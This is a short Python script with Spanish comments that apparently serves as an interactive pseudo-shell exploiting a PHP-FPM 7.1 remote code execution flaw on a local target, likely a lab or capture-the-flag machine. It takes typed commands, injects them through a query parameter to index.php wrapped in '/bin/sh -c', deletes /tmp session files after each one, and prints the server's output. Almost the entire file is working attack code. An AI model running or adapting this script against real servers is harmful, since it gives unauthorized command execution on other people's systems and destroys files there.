#!/usr/bin/python3

import requests
import signal
import time
import sys

URL = "http://127.0.0.1:8001"

# Funciones
def exit2calle(signum, frame):  # Controlamos salida usando Ctrl+C
    print(Color.RED + "\n\nSali3nd0..." + Color.END)
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

# Clases
class Color:
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WHITE = '\033[1;37m'
    RED = '\033[91m'
    END = '\033[0m'

# Inicio del programa
print(Color.CYAN + "\nEjecutando FakeShell (RCE) al explotar PHP-FPM/7.1" + Color.END)
print(Color.DARKCYAN + "\t\t\t    para salir escribe: q\n" + Color.END)
time.sleep(1)

cont = 1
while True:
    command = input(Color.WHITE + "(FPMuerto) ~> " + Color.END)
    if command == "q":
        print(Color.GREEN + "\nSaliendo de manera decente :P\n" + Color.END)
        break

    while True:
        r = requests.get(URL + '/index.php', params={"a":f"/bin/sh -c '{command} && rm -r /tmp/sess*'&"})

        if len(r.text) != 53:
            '''
            # Cuando no nos devuelve el resultado del comando, muestra: batch mode: /usr/bin/ersatool create|print|revoke CN y dos saltos de linea (53 caracteres)
            # Entonces si la respuesta es distinta a 53 caracteres, podemos intuir que nos devolvio algo. Lo mostramos y quitamos los dos saltos de linea
            '''
            pos_warning = r.text.find("Warning:")
            print(r.text[:pos_warning-2])
            cont = 1
            break

        cont += 1
        if cont == 30:  # Hacemos 30 intentos
            print(f"El comando no causa ningun output.")
            break
